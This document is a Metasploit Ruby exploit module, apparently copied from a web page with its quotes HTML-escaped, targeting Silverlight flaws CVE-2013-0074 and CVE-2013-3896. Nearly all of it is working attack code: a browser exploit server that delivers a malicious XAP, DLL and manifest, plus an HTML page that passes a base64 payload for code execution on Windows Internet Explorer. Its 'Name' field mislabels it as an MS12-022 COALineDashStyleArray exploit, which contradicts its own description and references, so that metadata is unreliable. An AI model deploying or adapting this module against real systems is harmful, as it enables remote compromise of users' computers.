# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::BrowserExploitServer
 
  MANIFEST = <<-EOS
<Deployment xmlns="http://schemas.microsoft.com/client/2007/deployment" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" EntryPointAssembly="SilverApp1" EntryPointType="SilverApp1.App" RuntimeVersion="4.0.50826.0">
  <Deployment.Parts>
    <AssemblyPart x:Name="SilverApp1" Source="SilverApp1.dll" />
  </Deployment.Parts>
</Deployment>
  EOS
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "MS12-022 Microsoft Internet Explorer COALineDashStyleArray Unsafe Memory Access",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability on Microsoft Silverlight. The vulnerability exists on
        the Initialize() method from System.Windows.Browser.ScriptObject, which access memory in an
        unsafe manner. Since it is accessible for untrusted code (user controlled) it&#039;s possible
        to dereference arbitrary memory which easily leverages to arbitrary code execution. In order
        to bypass DEP/ASLR a second vulnerability is used, in the public WriteableBitmap class
        from System.Windows.dll. This module has been tested successfully on IE6 - IE10, Windows XP
        SP3 / Windows 7 SP1 on both x32 and x64 architectures.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;James Forshaw&#039;,   # RCE Vulnerability discovery
          &#039;Vitaliy Toropov&#039;, # Info Leak discovery, original exploit, all the hard work
          &#039;juan vazquez&#039;     # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-0074&#039; ],
          [ &#039;CVE&#039;, &#039;2013-3896&#039; ],
          [ &#039;OSVDB&#039;, &#039;91147&#039; ],
          [ &#039;OSVDB&#039;, &#039;98223&#039; ],
          [ &#039;BID&#039;, &#039;58327&#039; ],
          [ &#039;BID&#039;, &#039;62793&#039; ],
          [ &#039;MSB&#039;, &#039;MS13-022&#039; ],
          [ &#039;MSB&#039;, &#039;MS13-087&#039; ],
          [ &#039;URL&#039;, &#039;http://packetstormsecurity.com/files/123731/&#039; ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
          &#039;EXITFUNC&#039;             => &#039;thread&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X86_64],
      &#039;BrowserRequirements&#039; =>
        {
          :source  => /script|headers/i,
          :os_name => Msf::OperatingSystems::WINDOWS,
          :ua_name => Msf::HttpClients::IE
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows x86&#039;,
            {
              &#039;arch&#039;      => ARCH_X86
            }
          ],
          [ &#039;Windows x64&#039;,
            {
              &#039;arch&#039;      => ARCH_X86_64
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Mar 12 2013",
      &#039;DefaultTarget&#039;  => 0))
 
  end
 
  def setup
    @xap_name = "#{rand_text_alpha(5 + rand(5))}.xap"
    @dll_name = "#{rand_text_alpha(5 + rand(5))}.dll"
    File.open(File.join( Msf::Config.data_directory, "exploits", "cve-2013-0074", "SilverApp1.xap" ), "rb") { |f| @xap = f.read }
    File.open(File.join( Msf::Config.data_directory, "exploits", "cve-2013-0074", "SilverApp1.dll" ), "rb") { |f| @dll = f.read }
    @xaml = MANIFEST.gsub(/SilverApp1\.dll/, @dll_name)
    super
  end
 
  def exploit_template(cli, target_info)
 
    my_payload = get_payload(cli, target_info)
 
    # Align to 4 bytes the x86 payload
    if target_info[:arch] == ARCH_X86
      while my_payload.length % 4 != 0
        my_payload = "\x90" + my_payload
      end
    end
 
    my_payload = Rex::Text.encode_base64(my_payload)
 
    html_template = <<-EOF
<html>
<!-- saved from url=(0014)about:internet -->
<head>
  <title>Silverlight Application</title>
  <style type="text/css">
    html, body { height: 100%; overflow: auto; }
    body { padding: 0; margin: 0; }
    #form1 { height: 99%; }
    #silverlightControlHost { text-align:center; }
  </style>
</head>
<body>
  <form id="form1" runat="server" >
    <div id="silverlightControlHost">
    <object data="data:application/x-silverlight-2," type="application/x-silverlight-2" width="100%" height="100%">
      <param name="source" value="<%= @xap_name %>"/>
      <param name="background" value="white" />
      <param name="InitParams" value="payload=<%= my_payload %>" />
    </object>
    </div>
  </form>
</body>
</html>
EOF
 
    return html_template, binding()
  end
 
  def on_request_exploit(cli, request, target_info)
    print_status("request: #{request.uri}")
    if request.uri =~ /#{@xap_name}$/
      print_status("Sending XAP...")
      send_response(cli, @xap, { &#039;Content-Type&#039; => &#039;application/x-silverlight-2&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Cache-Control&#039; => &#039;no-cache&#039; })
    elsif request.uri =~ /#{@dll_name}$/
      print_status("Sending DLL...")
      send_response(cli, @dll, { &#039;Content-Type&#039; => &#039;application/octect-stream&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Cache-Control&#039; => &#039;no-cache&#039; })
    elsif request.uri =~ /AppManifest.xaml$/
      print_status("Sending XAML...")
      send_response(cli, @xaml, { &#039;Content-Type&#039; => &#039;text/xaml&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Cache-Control&#039; => &#039;no-cache&#039; })
    else
      print_status("Sending HTML...")
      send_exploit_html(cli, exploit_template(cli, target_info))
    end
  end
 
end

